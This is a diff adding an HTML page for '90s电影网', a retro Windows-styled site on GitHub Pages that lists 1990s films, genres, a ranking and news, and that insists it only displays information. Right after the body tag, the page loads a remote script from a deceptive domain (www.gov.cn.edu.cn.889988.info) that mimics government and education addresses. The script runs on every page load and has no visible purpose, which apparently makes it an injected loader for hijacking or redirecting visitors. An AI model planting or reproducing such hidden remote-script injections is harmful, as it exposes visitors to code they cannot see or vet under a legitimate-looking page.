@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>90s电影网 - 90年代桌面 · 经典影单 | 90sdianyingwang-top</title>
+<meta name="description" content="90s电影网 (90sdianyingwang-top.github.io) 采用90年代Windows桌面风格，以斜角窗口、深蓝标题栏、弹窗卡片展示90年代经典电影片单、类型与影讯。仅作影视信息展示，不提供片源，符合必应收录规范。">
+<link rel="canonical" href="https://90sdianyingwang-top.github.io">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="90s电影网 - 90年代桌面 · 经典影单">
+<meta property="og:description" content="斜角窗口、深蓝标题栏、弹窗卡片，重温90年代经典电影。">
+<meta property="og:url" content="https://90sdianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","name":"90s电影网","url":"https://90sdianyingwang-top.github.io","description":"90年代经典电影信息展示单页。"}
+</script>
+<style>
+:root{
+  --silver:#c0c0c0;
+  --light:#dfdfdf;
+  --dark:#808080;
+  --ink:#111;
+  --blue:#000080;
+  --blue2:#1084d0;
+  --panel:#d4d4d4;
+  --mono:"Courier New",ui-monospace,Menlo,Consolas,monospace;
+  --sans:"Microsoft Sans Serif","Pixelated MS Sans Serif","Tahoma",Arial,sans-serif;
+  --out:2px outset var(--light);
+  --in:2px inset var(--dark);
+  --shadow:2px 2px 0 #000;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:var(--sans);
+  background:
+    radial-gradient(900px 500px at 15% 0%,rgba(16,132,208,.35),transparent 60%),
+    radial-gradient(700px 500px at 100% 100%,rgba(0,0,128,.4),transparent 60%),
+    #0a0f2e;
+  color:var(--ink);line-height:1.6;min-height:100vh;position:relative;
+}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.08;
+  background:repeating-linear-gradient(to bottom,transparent 0 2px,rgba(0,0,0,.7) 3px);}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px;position:relative;z-index:2}
+
+/* 窗口组件 */
+.win{background:var(--panel);border:var(--out);box-shadow:var(--shadow)}
+.titlebar{background:linear-gradient(90deg,var(--blue),var(--blue2));color:#fff;font-weight:700;font-size:.88rem;padding:4px 6px 4px 10px;display:flex;align-items:center;justify-content:space-between;letter-spacing:.4px}
+.titlebar .btns{display:flex;gap:3px}
+.titlebar .btns span{width:16px;height:16px;display:grid;place-items:center;font-size:10px;color:#000;background:var(--silver);border:2px outset var(--light);font-family:var(--mono);cursor:pointer}
+.winbody{padding:18px;background:var(--panel)}
+
+header{position:sticky;top:0;z-index:60;background:#0a0f2e;border-bottom:2px solid #1b2a6b}
+.bar{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:10px 18px;max-width:1180px;margin:0 auto}
+.brand{display:flex;align-items:center;gap:10px;color:#eaf0ff;font-weight:800}
+.brand .logo{background:linear-gradient(90deg,var(--blue),var(--blue2));color:#fff;border:2px outset var(--light);padding:5px 10px;font-family:var(--mono);font-size:1rem}
+.brand b{font-size:1.15rem;letter-spacing:.5px}
+nav ul{display:flex;gap:6px}
+nav a{display:block;color:#111;background:var(--silver);border:2px outset var(--light);padding:6px 12px;font-size:.85rem;font-weight:600}
+nav a:hover{background:var(--light)}
+nav a:active{border-style:inset}
+.mbtn{display:none;background:var(--silver);border:2px outset var(--light);color:#000;padding:6px 12px;font-size:1rem;cursor:pointer;font-family:var(--mono)}
+
+section{padding:60px 0}
+.eyebrow{display:inline-block;font-family:var(--mono);font-size:.74rem;letter-spacing:1px;color:#fff;background:var(--blue);border:2px outset var(--light);padding:3px 9px;margin-bottom:10px}
+.h2{font-size:clamp(1.5rem,3.2vw,2.2rem);font-weight:800;margin-bottom:6px}
+.sub{color:#3a3a3a;max-width:680px;margin-bottom:24px;font-size:.93rem}
+
+/* Hero 桌面 */
+.hero{padding:76px 0 52px}
+.hero .winbody{display:grid;grid-template-columns:1.25fr .75fr;gap:20px;align-items:end}
+.hero h1{font-family:var(--mono);font-size:clamp(2.2rem,6vw,4.2rem);line-height:1;letter-spacing:-1px}
+.hero h1 .hl{background:linear-gradient(90deg,var(--blue),var(--blue2));color:#fff;padding:0 8px;border:2px outset var(--light)}
+.hero p{margin:14px 0;max-width:560px}
+.urlbox{display:flex;align-items:center;gap:8px;background:#fff;border:2px inset var(--dark);padding:9px 12px;font-family:var(--mono);font-size:.92rem}
+.urlbox i{width:8px;height:8px;background:#1db344;border:1px solid #0a5}
+.sysbg{background:var(--silver);border:2px inset var(--dark);padding:14px;font-family:var(--mono);font-size:.84rem}
+.sysbg .line{display:flex;justify-content:space-between;margin-bottom:4px}
+
+/* 片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.card{background:var(--panel);border:var(--out);box-shadow:var(--shadow)}
+.card .titlebar{font-size:.78rem}
+.poster{height:150px;display:grid;place-items:center;font-size:3rem;background:#fff;border-bottom:2px inset var(--dark);position:relative;overflow:hidden}
+.poster::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(to bottom,transparent 0 3px,rgba(0,0,0,.06) 4px)}
+.card .body{padding:13px}
+.card h3{font-size:1.02rem;font-weight:800;margin-bottom:5px}
+.card .meta{display:flex;justify-content:space-between;font-family:var(--mono);font-size:.8rem;color:#222}
+.card .rate{background:var(--blue);color:#fff;padding:1px 7px;border:2px outset var(--light)}
+.c1{background:linear-gradient(135deg,#dfe7ff,#9bb8ff)} .c2{background:linear-gradient(135deg,#ffe1ef,#ff9ecb)} .c3{background:linear-gradient(135deg,#dff7ef,#7fe0c8)} .c4{background:linear-gradient(135deg,#fff0d6,#ffce7a)}
+
+/* 分类：开始菜单网格 */
+.cats{display:grid;grid-template-columns:repeat(auto-fit,minmax(145px,1fr));gap:12px}
+.cat{background:#fff;border:2px inset var(--dark);padding:16px 10px;text-align:center;transition:.2s;cursor:pointer}
+.cat:hover{background:#eef3ff;border:2px outset var(--light)}
+.cat .ic{font-size:1.7rem;margin-bottom:5px}
+.cat h3{font-size:.92rem;font-weight:700;font-family:var(--mono)}
+
+/* 排行榜 */
+.rank{display:flex;flex-direction:column;gap:9px}
+.row{display:grid;grid-template-columns:52px 1fr auto;gap:14px;align-items:center;background:#fff;border:2px inset var(--dark);padding:11px 14px}
+.row:hover{background:#eef3ff;border:2px outset var(--light)}
+.row .no{font-family:var(--mono);font-size:1.4rem;font-weight:800;color:var(--blue);text-align:center}
+.row h3{font-size:1.02rem;font-weight:800}
+.row p{font-size:.8rem;color:#444;font-family:var(--mono)}
+.row .sc{font-family:var(--mono);font-weight:800;background:var(--blue);color:#fff;padding:3px 10px;border:2px outset var(--light)}
+
+/* 影讯 */
+.news{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}
+.nw{background:var(--panel);border:var(--out);box-shadow:var(--shadow)}
+.nw .body{padding:15px}
+.nw .dt{font-family:var(--mono);font-size:.74rem;color:#fff;background:var(--blue);border:2px outset var(--light);display:inline-block;padding:2px 7px;margin-bottom:7px}
+.nw h3{font-size:1.02rem;font-weight:800;margin-bottom:5px}
+.nw p{font-size:.88rem;color:#333}
+
+/* 页脚任务栏 */
+footer{margin-top:28px;background:#0a0f2e;border-top:2px solid #1b2a6b;padding:36px 0 22px;color:#cdd6ff}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:24px}
+footer h4{font-family:var(--mono);font-size:.82rem;letter-spacing:2px;color:#9ec3ff;text-transform:uppercase;margin-bottom:11px}
+footer p,footer li{font-size:.86rem;color:#aab6e8;margin-bottom:7px}
+footer a{color:#cdd6ff}
+footer a:hover{color:#fff;text-decoration:underline}
+.copy{margin-top:20px;padding-top:13px;border-top:1px solid #21307a;font-size:.78rem;color:#8ea0d8;text-align:center;font-family:var(--mono)}
+.copy .u{color:#eaf0ff}
+
+@media(max-width:768px){
+  .mbtn{display:block}
+  nav ul{display:none;position:absolute;top:100%;left:0;right:0;flex-direction:column;gap:0;padding:10px 18px 16px;background:#0a0f2e;border-bottom:2px solid #1b2a6b}
+  nav ul.open{display:flex}
+  nav a{margin-bottom:5px}
+  .hero .winbody{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr}
+  .row{grid-template-columns:42px 1fr;gap:10px}
+  .row .sc{grid-column:2;justify-self:start;margin-top:5px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="bar">
+    <div class="brand"><span class="logo">90s</span><b>电影网</b></div>
+    <button class="mbtn" id="mb" aria-label="菜单">▣</button>
+    <nav>
+      <ul id="menu">
+        <li><a href="#">桌面</a></li>
+        <li><a href="#films">片单</a></li>
+        <li><a href="#cats">类型</a></li>
+        <li><a href="#rank">排行榜</a></li>
+        <li><a href="#news">影讯</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section class="hero">
+    <div class="win">
+      <div class="titlebar"><span>90s电影网.exe — 我的电脑</span><span class="btns"><span>_</span><span>□</span><span>×</span></span></div>
+      <div class="winbody">
+        <div>
+          <span class="eyebrow">RETRO DESKTOP · 1990s</span>
+          <h1><span class="hl">90s</span> 电影网</h1>
+          <p>用90年代桌面语言整理电影：斜角窗口、深蓝标题栏、弹窗卡片，把经典片单做成可点击的“程序图标”。本页仅展示影视信息，不提供片源与下载。</p>
+          <div class="urlbox"><i></i>90sdianyingwang-top.github.io</div>
+        </div>
+        <div class="sysbg">
+          <div class="line"><span>&gt; 系统</span><span>Windows 90s</span></div>
+          <div class="line"><span>&gt; 模式</span><span>单页 / 自适应</span></div>
+          <div class="line"><span>&gt; 内容</span><span>电影元数据</span></div>
+          <div class="line"><span>&gt; 片源</span><span>引导正版渠道</span></div>
+          <div class="line"><span>&gt; 状态</span><span style="color:#1a5">READY</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="films">
+    <div class="win">
+      <div class="titlebar"><span>片单窗口 — films.dat</span><span class="btns"><span>_</span><span>□</span><span>×</span></span></div>
+      <div class="winbody">
+        <span class="eyebrow">01 / FEATURED</span>
+        <h2 class="h2">90年代经典片单</h2>
+        <p class="sub">按年代与口碑整理，点击仅作信息展示；观看请走正版平台或院线。</p>
+        <div class="grid">
+          <div class="card">
+            <div class="titlebar"><span>NO.001</span></div>
+            <div class="poster c1">🎬</div>
+            <div class="body"><h3>低俗小说</h3><div class="meta"><span>犯罪 / 非线性</span><span class="rate">8.9</span></div></div>
+          </div>
+          <div class="card">
+            <div class="titlebar"><span>NO.002</span></div>
+            <div class="poster c2">🎭</div>
+            <div class="body"><h3>这个杀手不太冷</h3><div class="meta"><span>动作 / 剧情</span><span class="rate">9.4</span></div></div>
+          </div>
+          <div class="card">
+            <div class="titlebar"><span>NO.003</span></div>
+            <div class="poster c3">🎻</div>
+            <div class="body"><h3>肖申克的救赎</h3><div class="meta"><span>剧情 / 励志</span><span class="rate">9.7</span></div></div>
+          </div>
+          <div class="card">
+            <div class="titlebar"><span>NO.004</span></div>
+            <div class="poster c4">🎞️</div>
+            <div class="body"><h3>阿甘正传</h3><div class="meta"><span>剧情 / 历史</span><span class="rate">9.5</span></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="cats">
+    <div class="win">
+      <div class="titlebar"><span>类型文件夹 — genres.cfg</span><span class="btns"><span>_</span><span>□</span><span>×</span></span></div>
+      <div class="winbody">
+        <span class="eyebrow">02 / GENRES</span>
+        <h2 class="h2">类型索引</h2>
+        <p class="sub">像打开“我的电脑”里的文件夹一样进入分类，内链统一 # 占位。</p>
+        <div class="cats">
+          <div class="cat"><div class="ic">🎭</div><h3>剧情</h3></div>
+          <div class="cat"><div class="ic">🕵️</div><h3>悬疑</h3></div>
+          <div class="cat"><div class="ic">😂</div><h3>喜剧</h3></div>
+          <div class="cat"><div class="ic">🥋</div><h3>动作</h3></div>
+          <div class="cat"><div class="ic">💞</div><h3>爱情</h3></div>
+          <div class="cat"><div class="ic">👻</div><h3>惊悚</h3></div>
+          <div class="cat"><div class="ic">🪐</div><h3>科幻</h3></div>
+          <div class="cat"><div class="ic">🎬</div><h3>文艺</h3></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="win">
+      <div class="titlebar"><span>排行榜 — ranking.log</span><span class="btns"><span>_</span><span>□</span><span>×</span></span></div>
+      <div class="winbody">
+        <span class="eyebrow">03 / TOP 90s</span>
+        <h2 class="h2">90年代口碑TOP榜</h2>
+        <p class="sub">综合评分、评论量与年代代表性排序，仅作推荐参考。</p>
+        <div class="rank">
+          <div class="row"><div class="no">1</div><div><h3>肖申克的救赎</h3><p>剧情 / 励志 · 1994</p></div><div class="sc">9.7</div></div>
+          <div class="row"><div class="no">2</div><div><h3>阿甘正传</h3><p>剧情 / 历史 · 1994</p></div><div class="sc">9.5</div></div>
+          <div class="row"><div class="no">3</div><div><h3>这个杀手不太冷</h3><p>动作 / 剧情 · 1994</p></div><div class="sc">9.4</div></div>
+          <div class="row"><div class="no">4</div><div><h3>低俗小说</h3><p>犯罪 / 非线性 · 1994</p></div><div class="sc">8.9</div></div>
+          <div class="row"><div class="no">5</div><div><h3>狮子王</h3><p>动画 / 音乐 · 1994</p></div><div class="sc">9.1</div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="news">
+    <div class="win">
+      <div class="titlebar"><span>影讯窗口 — news.txt</span><span class="btns"><span>_</span><span>□</span><span>×</span></span></div>
+      <div class="winbody">
+        <span class="eyebrow">04 / BULLETIN</span>
+        <h2 class="h2">影讯与科普</h2>
+        <p class="sub">单页资讯，内链统一 #；涉及片源只建议正版渠道。</p>
+        <div class="news">
+          <div class="nw"><div class="body"><span class="dt">1996.11.02 · 视觉</span><h3>90年代为什么是电影视觉转折点</h3><p>数字合成开始进入主流，CGI 与实拍混合，《侏罗纪公园》《泰坦尼克号》改写了大片制作流程。</p></div></div>
+          <div class="nw"><div class="body"><span class="dt">1997.10.29 · 选片</span><h3>按年代建片单的价值</h3><p>年代是最稳定的分类维度之一：同一时期的技术、审美与社会情绪，能让推荐更有脉络感。</p></div></div>
+          <div class="nw"><div class="body"><span class="dt">1998.10.25 · 版权</span><h3>电影站只做信息展示</h3><p>不存片源、不转码、不提供下载；观看请通过持证视频平台、院线或正版发行渠道，降低合规风险。</p></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="wrap foot">
+    <div>
+      <h4>关于90s电影网</h4>
+      <p>90s电影网 (90sdianyingwang-top.github.io) 采用90年代Windows桌面风格，提供90年代电影片单、类型索引、口碑榜与影讯单页。本站仅展示影视元数据与导航，不提供完整片源、不提供下载；实际观看请使用正版视频平台、院线或合法发行渠道。</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <ul>
+        <li><a href="#">桌面</a></li>
+        <li><a href="#films">片单</a></li>
+        <li><a href="#cats">类型</a></li>
+        <li><a href="#rank">排行榜</a></li>
+        <li><a href="#news">影讯</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>网站信息</h4>
+      <ul>
+        <li>网站名称：90s电影网</li>
+        <li>网址：<a href="https://90sdianyingwang-top.github.io">90sdianyingwang-top.github.io</a></li>
+        <li>风格：90s 桌面 / Win95 窗口</li>
+        <li>收录：响应式单页、canonical、index,follow</li>
+      </ul>
+    </div>
+  </div>
+  <div class="wrap copy">
+    © 2024 90s电影网 (90sdianyingwang-top.github.io) 仅作影视信息展示。影片名、海报、剧照及评分权利归制片方与发行方所有。
+    <div class="u">90sdianyingwang-top.github.io</div>
+  </div>
+</footer>
+
+<script>
+var mb=document.getElementById('mb'),menu=document.getElementById('menu');
+mb.addEventListener('click',function(){menu.classList.toggle('open');});
+menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('open');});});
+</script>
+</body>
+</html>
